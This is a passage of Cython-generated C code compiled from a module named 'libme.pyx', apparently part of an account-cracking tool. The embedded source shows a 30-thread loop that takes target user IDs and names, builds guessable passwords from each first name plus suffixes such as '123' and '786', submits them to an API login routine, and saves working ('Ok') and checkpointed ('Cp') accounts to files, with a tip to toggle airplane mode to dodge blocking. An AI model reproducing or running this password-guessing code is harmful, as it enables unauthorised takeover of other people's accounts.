      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_3 = __Pyx_PyObject_LookupSpecial(__pyx_t_5, __pyx_n_s_exit_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 523, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_3);
      __pyx_t_10 = __Pyx_PyObject_LookupSpecial(__pyx_t_5, __pyx_n_s_enter); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 523, __pyx_L33_error)
      __Pyx_GOTREF(__pyx_t_10);
      __pyx_t_17 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_10))) {
        __pyx_t_17 = PyMethod_GET_SELF(__pyx_t_10);
        if (likely(__pyx_t_17)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
          __Pyx_INCREF(__pyx_t_17);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_10, function);
        }
      }
      __pyx_t_4 = (__pyx_t_17) ? __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_t_17) : __Pyx_PyObject_CallNoArg(__pyx_t_10);
      __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 523, __pyx_L33_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_t_10 = __pyx_t_4;
      __pyx_t_4 = 0;
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      /*try:*/ {
        {
          __Pyx_PyThreadState_declare
          __Pyx_PyThreadState_assign
          __Pyx_ExceptionSave(&__pyx_t_14, &__pyx_t_1, &__pyx_t_2);
          __Pyx_XGOTREF(__pyx_t_14);
          __Pyx_XGOTREF(__pyx_t_1);
          __Pyx_XGOTREF(__pyx_t_2);
          /*try:*/ {
            __pyx_v_coeg = __pyx_t_10;
            __pyx_t_10 = 0;

            /* "libme.pyx":524
 * 		elif ask == "t":
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 					print("\n  \033[0;97m[] Ok result saved in > ok.txt")             # <<<<<<<<<<<<<<
 * 					print("  [] Cp result saved in > cp.txt")
 * 					print("  [!] if no result turn on airplane mode 5 seconds\n")
 */
            if (__Pyx_PrintOne(0, __pyx_kp_s_0_97m_Ok_result_saved_in_ok_txt) < 0) __PYX_ERR(0, 524, __pyx_L37_error)

            /* "libme.pyx":525
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 					print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 * 					print("  [] Cp result saved in > cp.txt")             # <<<<<<<<<<<<<<
 * 					print("  [!] if no result turn on airplane mode 5 seconds\n")
 * 					for user in self.id:
 */
            if (__Pyx_PrintOne(0, __pyx_kp_s_Cp_result_saved_in_cp_txt) < 0) __PYX_ERR(0, 525, __pyx_L37_error)

            /* "libme.pyx":526
 * 					print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 * 					print("  [] Cp result saved in > cp.txt")
 * 					print("  [!] if no result turn on airplane mode 5 seconds\n")             # <<<<<<<<<<<<<<
 * 					for user in self.id:
 * 						uid, name = user.split("|")
 */
            if (__Pyx_PrintOne(0, __pyx_kp_s_if_no_result_turn_on_airplane_m) < 0) __PYX_ERR(0, 526, __pyx_L37_error)

            /* "libme.pyx":527
 * 					print("  [] Cp result saved in > cp.txt")
 * 					print("  [!] if no result turn on airplane mode 5 seconds\n")
 * 					for user in self.id:             # <<<<<<<<<<<<<<
 * 						uid, name = user.split("|")
 * 						ft = name.split(" ")[0]
 */
            __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_id); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 527, __pyx_L37_error)
            __Pyx_GOTREF(__pyx_t_10);
            if (likely(PyList_CheckExact(__pyx_t_10)) || PyTuple_CheckExact(__pyx_t_10)) {
              __pyx_t_5 = __pyx_t_10; __Pyx_INCREF(__pyx_t_5); __pyx_t_7 = 0;
              __pyx_t_8 = NULL;
            } else {
              __pyx_t_7 = -1; __pyx_t_5 = PyObject_GetIter(__pyx_t_10); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 527, __pyx_L37_error)
              __Pyx_GOTREF(__pyx_t_5);
              __pyx_t_8 = Py_TYPE(__pyx_t_5)->tp_iternext; if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 527, __pyx_L37_error)
            }
            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
            for (;;) {
              if (likely(!__pyx_t_8)) {
                if (likely(PyList_CheckExact(__pyx_t_5))) {
                  if (__pyx_t_7 >= PyList_GET_SIZE(__pyx_t_5)) break;
                  #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                  __pyx_t_10 = PyList_GET_ITEM(__pyx_t_5, __pyx_t_7); __Pyx_INCREF(__pyx_t_10); __pyx_t_7++; if (unlikely(0 < 0)) __PYX_ERR(0, 527, __pyx_L37_error)
                  #else
                  __pyx_t_10 = PySequence_ITEM(__pyx_t_5, __pyx_t_7); __pyx_t_7++; if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 527, __pyx_L37_error)
                  __Pyx_GOTREF(__pyx_t_10);
                  #endif
                } else {
                  if (__pyx_t_7 >= PyTuple_GET_SIZE(__pyx_t_5)) break;
                  #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                  __pyx_t_10 = PyTuple_GET_ITEM(__pyx_t_5, __pyx_t_7); __Pyx_INCREF(__pyx_t_10); __pyx_t_7++; if (unlikely(0 < 0)) __PYX_ERR(0, 527, __pyx_L37_error)
                  #else
                  __pyx_t_10 = PySequence_ITEM(__pyx_t_5, __pyx_t_7); __pyx_t_7++; if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 527, __pyx_L37_error)
                  __Pyx_GOTREF(__pyx_t_10);
                  #endif
                }
              } else {
                __pyx_t_10 = __pyx_t_8(__pyx_t_5);
                if (unlikely(!__pyx_t_10)) {
                  PyObject* exc_type = PyErr_Occurred();
                  if (exc_type) {
                    if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
                    else __PYX_ERR(0, 527, __pyx_L37_error)
                  }
                  break;
                }
                __Pyx_GOTREF(__pyx_t_10);
              }
              __Pyx_XDECREF_SET(__pyx_v_user, __pyx_t_10);
              __pyx_t_10 = 0;

              /* "libme.pyx":528
 * 					print("  [!] if no result turn on airplane mode 5 seconds\n")
 * 					for user in self.id:
 * 						uid, name = user.split("|")             # <<<<<<<<<<<<<<
 * 						ft = name.split(" ")[0]
 * 						if len(ft)>=6:
 */
              __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_user, __pyx_n_s_split); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 528, __pyx_L37_error)
              __Pyx_GOTREF(__pyx_t_4);
              __pyx_t_17 = NULL;
              if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
                __pyx_t_17 = PyMethod_GET_SELF(__pyx_t_4);
                if (likely(__pyx_t_17)) {
                  PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
                  __Pyx_INCREF(__pyx_t_17);
                  __Pyx_INCREF(function);
                  __Pyx_DECREF_SET(__pyx_t_4, function);
                }
              }
              __pyx_t_10 = (__pyx_t_17) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_17, __pyx_kp_s__38) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_kp_s__38);
              __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
              if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 528, __pyx_L37_error)
              __Pyx_GOTREF(__pyx_t_10);
              __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
              if ((likely(PyTuple_CheckExact(__pyx_t_10))) || (PyList_CheckExact(__pyx_t_10))) {
                PyObject* sequence = __pyx_t_10;
                Py_ssize_t size = __Pyx_PySequence_SIZE(sequence);
                if (unlikely(size != 2)) {
                  if (size > 2) __Pyx_RaiseTooManyValuesError(2);
                  else if (size >= 0) __Pyx_RaiseNeedMoreValuesError(size);
                  __PYX_ERR(0, 528, __pyx_L37_error)
                }
                #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                if (likely(PyTuple_CheckExact(sequence))) {
                  __pyx_t_4 = PyTuple_GET_ITEM(sequence, 0); 
                  __pyx_t_17 = PyTuple_GET_ITEM(sequence, 1); 
                } else {
                  __pyx_t_4 = PyList_GET_ITEM(sequence, 0); 
                  __pyx_t_17 = PyList_GET_ITEM(sequence, 1); 
                }
                __Pyx_INCREF(__pyx_t_4);
                __Pyx_INCREF(__pyx_t_17);
                #else
                __pyx_t_4 = PySequence_ITEM(sequence, 0); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 528, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_4);
                __pyx_t_17 = PySequence_ITEM(sequence, 1); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 528, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_17);
                #endif
                __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
              } else {
                Py_ssize_t index = -1;
                __pyx_t_9 = PyObject_GetIter(__pyx_t_10); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 528, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_9);
                __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
                __pyx_t_15 = Py_TYPE(__pyx_t_9)->tp_iternext;
                index = 0; __pyx_t_4 = __pyx_t_15(__pyx_t_9); if (unlikely(!__pyx_t_4)) goto __pyx_L45_unpacking_failed;
                __Pyx_GOTREF(__pyx_t_4);
                index = 1; __pyx_t_17 = __pyx_t_15(__pyx_t_9); if (unlikely(!__pyx_t_17)) goto __pyx_L45_unpacking_failed;
                __Pyx_GOTREF(__pyx_t_17);
                if (__Pyx_IternextUnpackEndCheck(__pyx_t_15(__pyx_t_9), 2) < 0) __PYX_ERR(0, 528, __pyx_L37_error)
                __pyx_t_15 = NULL;
                __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
                goto __pyx_L46_unpacking_done;
                __pyx_L45_unpacking_failed:;
                __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
                __pyx_t_15 = NULL;
                if (__Pyx_IterFinish() == 0) __Pyx_RaiseNeedMoreValuesError(index);
                __PYX_ERR(0, 528, __pyx_L37_error)
                __pyx_L46_unpacking_done:;
              }
              __Pyx_XDECREF_SET(__pyx_v_uid, __pyx_t_4);
              __pyx_t_4 = 0;
              __Pyx_XDECREF_SET(__pyx_v_name, __pyx_t_17);
              __pyx_t_17 = 0;

              /* "libme.pyx":529
 * 					for user in self.id:
 * 						uid, name = user.split("|")
 * 						ft = name.split(" ")[0]             # <<<<<<<<<<<<<<
 * 						if len(ft)>=6:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 */
              __pyx_t_17 = __Pyx_PyObject_GetAttrStr(__pyx_v_name, __pyx_n_s_split); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 529, __pyx_L37_error)
              __Pyx_GOTREF(__pyx_t_17);
              __pyx_t_4 = NULL;
              if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_17))) {
                __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_17);
                if (likely(__pyx_t_4)) {
                  PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_17);
                  __Pyx_INCREF(__pyx_t_4);
                  __Pyx_INCREF(function);
                  __Pyx_DECREF_SET(__pyx_t_17, function);
                }
              }
              __pyx_t_10 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_17, __pyx_t_4, __pyx_kp_s__43) : __Pyx_PyObject_CallOneArg(__pyx_t_17, __pyx_kp_s__43);
              __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
              if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 529, __pyx_L37_error)
              __Pyx_GOTREF(__pyx_t_10);
              __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
              __pyx_t_17 = __Pyx_GetItemInt(__pyx_t_10, 0, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 529, __pyx_L37_error)
              __Pyx_GOTREF(__pyx_t_17);
              __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
              __Pyx_XDECREF_SET(__pyx_v_ft, __pyx_t_17);
              __pyx_t_17 = 0;

              /* "libme.pyx":530
 * 						uid, name = user.split("|")
 * 						ft = name.split(" ")[0]
 * 						if len(ft)>=6:             # <<<<<<<<<<<<<<
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						elif len(ft) == 3 or len(ft) == 4 or len(ft) == 5:
 */
              __pyx_t_20 = PyObject_Length(__pyx_v_ft); if (unlikely(__pyx_t_20 == ((Py_ssize_t)-1))) __PYX_ERR(0, 530, __pyx_L37_error)
              __pyx_t_19 = ((__pyx_t_20 >= 6) != 0);
              if (__pyx_t_19) {

                /* "libme.pyx":531
 * 						ft = name.split(" ")[0]
 * 						if len(ft)>=6:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]             # <<<<<<<<<<<<<<
 * 						elif len(ft) == 3 or len(ft) == 4 or len(ft) == 5:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 */
                __pyx_t_17 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_123); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 531, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_17);
                __pyx_t_10 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_1234); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 531, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_10);
                __pyx_t_4 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_12345); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 531, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_4);
                __pyx_t_9 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_786); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 531, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_9);
                __pyx_t_6 = PyList_New(5); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 531, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_6);
                __Pyx_INCREF(__pyx_v_name);
                __Pyx_GIVEREF(__pyx_v_name);
                PyList_SET_ITEM(__pyx_t_6, 0, __pyx_v_name);
                __Pyx_GIVEREF(__pyx_t_17);
                PyList_SET_ITEM(__pyx_t_6, 1, __pyx_t_17);
                __Pyx_GIVEREF(__pyx_t_10);
                PyList_SET_ITEM(__pyx_t_6, 2, __pyx_t_10);
                __Pyx_GIVEREF(__pyx_t_4);
                PyList_SET_ITEM(__pyx_t_6, 3, __pyx_t_4);
                __Pyx_GIVEREF(__pyx_t_9);
                PyList_SET_ITEM(__pyx_t_6, 4, __pyx_t_9);
                __pyx_t_17 = 0;
                __pyx_t_10 = 0;
                __pyx_t_4 = 0;
                __pyx_t_9 = 0;
                __Pyx_XDECREF_SET(__pyx_v_pwx, ((PyObject*)__pyx_t_6));
                __pyx_t_6 = 0;

                /* "libme.pyx":530
 * 						uid, name = user.split("|")
 * 						ft = name.split(" ")[0]
 * 						if len(ft)>=6:             # <<<<<<<<<<<<<<
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						elif len(ft) == 3 or len(ft) == 4 or len(ft) == 5:
 */
                goto __pyx_L47;
              }

              /* "libme.pyx":532
 * 						if len(ft)>=6:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						elif len(ft) == 3 or len(ft) == 4 or len(ft) == 5:             # <<<<<<<<<<<<<<
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						else:
 */
              __pyx_t_20 = PyObject_Length(__pyx_v_ft); if (unlikely(__pyx_t_20 == ((Py_ssize_t)-1))) __PYX_ERR(0, 532, __pyx_L37_error)
              __pyx_t_13 = ((__pyx_t_20 == 3) != 0);
              if (!__pyx_t_13) {
              } else {
                __pyx_t_19 = __pyx_t_13;
                goto __pyx_L48_bool_binop_done;
              }
              __pyx_t_20 = PyObject_Length(__pyx_v_ft); if (unlikely(__pyx_t_20 == ((Py_ssize_t)-1))) __PYX_ERR(0, 532, __pyx_L37_error)
              __pyx_t_13 = ((__pyx_t_20 == 4) != 0);
              if (!__pyx_t_13) {
              } else {
                __pyx_t_19 = __pyx_t_13;
                goto __pyx_L48_bool_binop_done;
              }
              __pyx_t_20 = PyObject_Length(__pyx_v_ft); if (unlikely(__pyx_t_20 == ((Py_ssize_t)-1))) __PYX_ERR(0, 532, __pyx_L37_error)
              __pyx_t_13 = ((__pyx_t_20 == 5) != 0);
              __pyx_t_19 = __pyx_t_13;
              __pyx_L48_bool_binop_done:;
              if (__pyx_t_19) {

                /* "libme.pyx":533
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						elif len(ft) == 3 or len(ft) == 4 or len(ft) == 5:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]             # <<<<<<<<<<<<<<
 * 						else:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 */
                __pyx_t_6 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_123); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 533, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_6);
                __pyx_t_9 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_1234); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 533, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_9);
                __pyx_t_4 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_12345); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 533, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_4);
                __pyx_t_10 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_786); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 533, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_10);
                __pyx_t_17 = PyList_New(5); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 533, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_17);
                __Pyx_INCREF(__pyx_v_name);
                __Pyx_GIVEREF(__pyx_v_name);
                PyList_SET_ITEM(__pyx_t_17, 0, __pyx_v_name);
                __Pyx_GIVEREF(__pyx_t_6);
                PyList_SET_ITEM(__pyx_t_17, 1, __pyx_t_6);
                __Pyx_GIVEREF(__pyx_t_9);
                PyList_SET_ITEM(__pyx_t_17, 2, __pyx_t_9);
                __Pyx_GIVEREF(__pyx_t_4);
                PyList_SET_ITEM(__pyx_t_17, 3, __pyx_t_4);
                __Pyx_GIVEREF(__pyx_t_10);
                PyList_SET_ITEM(__pyx_t_17, 4, __pyx_t_10);
                __pyx_t_6 = 0;
                __pyx_t_9 = 0;
                __pyx_t_4 = 0;
                __pyx_t_10 = 0;
                __Pyx_XDECREF_SET(__pyx_v_pwx, ((PyObject*)__pyx_t_17));
                __pyx_t_17 = 0;

                /* "libme.pyx":532
 * 						if len(ft)>=6:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						elif len(ft) == 3 or len(ft) == 4 or len(ft) == 5:             # <<<<<<<<<<<<<<
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						else:
 */
                goto __pyx_L47;
              }

              /* "libme.pyx":535
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						else:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]             # <<<<<<<<<<<<<<
 * 						coeg.submit(self.__bapi__, uid, pwx)
 * 	def __menn__(self):
 */
              /*else*/ {
                __pyx_t_17 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_123); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 535, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_17);
                __pyx_t_10 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_1234); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 535, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_10);
                __pyx_t_4 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_12345); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 535, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_4);
                __pyx_t_9 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_786); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 535, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_9);
                __pyx_t_6 = PyList_New(5); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 535, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_6);
                __Pyx_INCREF(__pyx_v_name);
                __Pyx_GIVEREF(__pyx_v_name);
                PyList_SET_ITEM(__pyx_t_6, 0, __pyx_v_name);
                __Pyx_GIVEREF(__pyx_t_17);
                PyList_SET_ITEM(__pyx_t_6, 1, __pyx_t_17);
                __Pyx_GIVEREF(__pyx_t_10);
                PyList_SET_ITEM(__pyx_t_6, 2, __pyx_t_10);
                __Pyx_GIVEREF(__pyx_t_4);
                PyList_SET_ITEM(__pyx_t_6, 3, __pyx_t_4);
                __Pyx_GIVEREF(__pyx_t_9);
                PyList_SET_ITEM(__pyx_t_6, 4, __pyx_t_9);
                __pyx_t_17 = 0;
                __pyx_t_10 = 0;
                __pyx_t_4 = 0;
                __pyx_t_9 = 0;
                __Pyx_XDECREF_SET(__pyx_v_pwx, ((PyObject*)__pyx_t_6));
                __pyx_t_6 = 0;
              }
              __pyx_L47:;

              /* "libme.pyx":536
 * 						else:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						coeg.submit(self.__bapi__, uid, pwx)             # <<<<<<<<<<<<<<
 * 	def __menn__(self):
 * 		try:
 */
              __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_v_coeg, __pyx_n_s_submit); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 536, __pyx_L37_error)
              __Pyx_GOTREF(__pyx_t_9);
              __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_bapi); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 536, __pyx_L37_error)
              __Pyx_GOTREF(__pyx_t_4);
              __pyx_t_10 = NULL;
              __pyx_t_12 = 0;
              if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_9))) {
                __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_9);
                if (likely(__pyx_t_10)) {
                  PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_9);
                  __Pyx_INCREF(__pyx_t_10);
                  __Pyx_INCREF(function);
                  __Pyx_DECREF_SET(__pyx_t_9, function);
                  __pyx_t_12 = 1;
                }
              }
              #if CYTHON_FAST_PYCALL
              if (PyFunction_Check(__pyx_t_9)) {
                PyObject *__pyx_temp[4] = {__pyx_t_10, __pyx_t_4, __pyx_v_uid, __pyx_v_pwx};
                __pyx_t_6 = __Pyx_PyFunction_FastCall(__pyx_t_9, __pyx_temp+1-__pyx_t_12, 3+__pyx_t_12); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 536, __pyx_L37_error)
                __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
                __Pyx_GOTREF(__pyx_t_6);
                __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
              } else
              #endif
              #if CYTHON_FAST_PYCCALL
              if (__Pyx_PyFastCFunction_Check(__pyx_t_9)) {
                PyObject *__pyx_temp[4] = {__pyx_t_10, __pyx_t_4, __pyx_v_uid, __pyx_v_pwx};
                __pyx_t_6 = __Pyx_PyCFunction_FastCall(__pyx_t_9, __pyx_temp+1-__pyx_t_12, 3+__pyx_t_12); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 536, __pyx_L37_error)
                __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
                __Pyx_GOTREF(__pyx_t_6);
                __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
              } else
              #endif
              {
                __pyx_t_17 = PyTuple_New(3+__pyx_t_12); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 536, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_17);
                if (__pyx_t_10) {
                  __Pyx_GIVEREF(__pyx_t_10); PyTuple_SET_ITEM(__pyx_t_17, 0, __pyx_t_10); __pyx_t_10 = NULL;
                }
                __Pyx_GIVEREF(__pyx_t_4);
                PyTuple_SET_ITEM(__pyx_t_17, 0+__pyx_t_12, __pyx_t_4);
                __Pyx_INCREF(__pyx_v_uid);
                __Pyx_GIVEREF(__pyx_v_uid);
                PyTuple_SET_ITEM(__pyx_t_17, 1+__pyx_t_12, __pyx_v_uid);
                __Pyx_INCREF(__pyx_v_pwx);
                __Pyx_GIVEREF(__pyx_v_pwx);
                PyTuple_SET_ITEM(__pyx_t_17, 2+__pyx_t_12, __pyx_v_pwx);
                __pyx_t_4 = 0;
                __pyx_t_6 = __Pyx_PyObject_Call(__pyx_t_9, __pyx_t_17, NULL); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 536, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_6);
                __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
              }
              __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
              __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

              /* "libme.pyx":527
 * 					print("  [] Cp result saved in > cp.txt")
 * 					print("  [!] if no result turn on airplane mode 5 seconds\n")
 * 					for user in self.id:             # <<<<<<<<<<<<<<
 * 						uid, name = user.split("|")
 * 						ft = name.split(" ")[0]
 */
            }
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

            /* "libme.pyx":523
 * 					coeg.submit(self.__bapi__,uid, listpass.split(","))
 * 		elif ask == "t":
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:             # <<<<<<<<<<<<<<
 * 					print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 * 					print("  [] Cp result saved in > cp.txt")
 */
          }
          __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
          __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
          __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
          goto __pyx_L42_try_end;
          __pyx_L37_error:;
          __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
          __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
          __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
          __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
          __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
          __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
          /*except:*/ {
            __Pyx_AddTraceback("libme.James.__Frr__", __pyx_clineno, __pyx_lineno, __pyx_filename);
            if (__Pyx_GetException(&__pyx_t_5, &__pyx_t_6, &__pyx_t_9) < 0) __PYX_ERR(0, 523, __pyx_L39_except_error)
            __Pyx_GOTREF(__pyx_t_5);
            __Pyx_GOTREF(__pyx_t_6);
            __Pyx_GOTREF(__pyx_t_9);
            __pyx_t_17 = PyTuple_Pack(3, __pyx_t_5, __pyx_t_6, __pyx_t_9); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 523, __pyx_L39_except_error)
            __Pyx_GOTREF(__pyx_t_17);
            __pyx_t_18 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_t_17, NULL);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
            if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 523, __pyx_L39_except_error)
            __Pyx_GOTREF(__pyx_t_18);
            __pyx_t_19 = __Pyx_PyObject_IsTrue(__pyx_t_18);
            __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
            if (__pyx_t_19 < 0) __PYX_ERR(0, 523, __pyx_L39_except_error)
            __pyx_t_13 = ((!(__pyx_t_19 != 0)) != 0);
            if (__pyx_t_13) {
              __Pyx_GIVEREF(__pyx_t_5);
              __Pyx_GIVEREF(__pyx_t_6);
              __Pyx_XGIVEREF(__pyx_t_9);
              __Pyx_ErrRestoreWithState(__pyx_t_5, __pyx_t_6, __pyx_t_9);
              __pyx_t_5 = 0; __pyx_t_6 = 0; __pyx_t_9 = 0; 
              __PYX_ERR(0, 523, __pyx_L39_except_error)
            }
            __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
            __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
            __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
            goto __pyx_L38_exception_handled;
          }
          __pyx_L39_except_error:;
          __Pyx_XGIVEREF(__pyx_t_14);
          __Pyx_XGIVEREF(__pyx_t_1);
          __Pyx_XGIVEREF(__pyx_t_2);
